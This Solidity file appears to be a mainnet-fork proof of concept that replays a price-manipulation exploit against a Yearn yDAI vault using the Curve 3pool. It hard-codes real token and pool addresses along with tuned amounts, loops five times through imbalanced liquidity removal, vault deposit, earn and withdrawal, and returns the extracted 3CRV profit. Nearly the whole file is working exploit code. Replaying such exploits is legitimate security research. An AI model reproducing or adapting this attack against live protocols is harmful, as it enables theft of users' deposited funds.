// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

contract Exploit {
    function run() external returns (uint256) {
        CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        vm.createSelectFork("mainnet", 11792183);
        
        IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
        IYVDai yvdai = IYVDai(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);
        ICurve curve = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
        
        uint256 max_3crv_amount = 300000000000000000000000000;
        uint256 remove_usdt_amt = 167473454967245;
        uint256 remove_usdt_amt_final_round = 167288317922857;
        uint256[5] memory earn_amt = [
            uint256(105469871996916702826725376),
            uint256(104706920396703142299856646),
            uint256(103948014417774019565578888),
            uint256(103192919800803744390557088),
            uint256(102441640504232413679923590)
        ];
        uint256 init_add_dai_amt = 37972761178915525047091200;
        uint256 init_add_usdc_amt = 133000000000000;
        
        dai.approve(address(yvdai), type(uint256).max);
        usdt.approve(address(curve), type(uint256).max);
        dai.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);
        
        uint256 initialDai = dai.balanceOf(address(this));
        uint256 initialUsdc = usdc.balanceOf(address(this));
        uint256 initialCrv3 = crv3.balanceOf(address(this));
        require(usdt.balanceOf(address(this)) == 0, "");
        require(crv3.balanceOf(address(this)) == 0, "");
        require(yvdai.balanceOf(address(this)) == 0, "");
        
        curve.add_liquidity([init_add_dai_amt, init_add_usdc_amt, 0], 0);
        
        for (uint256 i = 0; i < 5; i++) {
            curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);
            yvdai.deposit(earn_amt[i]);
            yvdai.earn();
            if (i != 4) {
                curve.add_liquidity([0, 0, remove_usdt_amt], 0);
            } else {
                curve.add_liquidity([0, 0, remove_usdt_amt_final_round], 0);
            }
            yvdai.withdrawAll();
        }
        
        uint256 daiDiff = initialDai - dai.balanceOf(address(this));
        curve.remove_liquidity_imbalance([daiDiff + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);
        require(dai.balanceOf(address(this)) == initialDai + 1, "");
        require(usdc.balanceOf(address(this)) == initialUsdc + 1, "");
        
        uint256 profit = crv3.balanceOf(address(this)) - initialCrv3;
        return profit;
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
    function remove_liquidity(uint256 token_amount, uint256[3] memory min_amounts) external returns (uint256[3] memory);
    function get_virtual_price() external view returns (uint256);
}

interface IYVDai {
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256 _amount) external;
    function earn() external;
    function withdrawAll() external;
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}
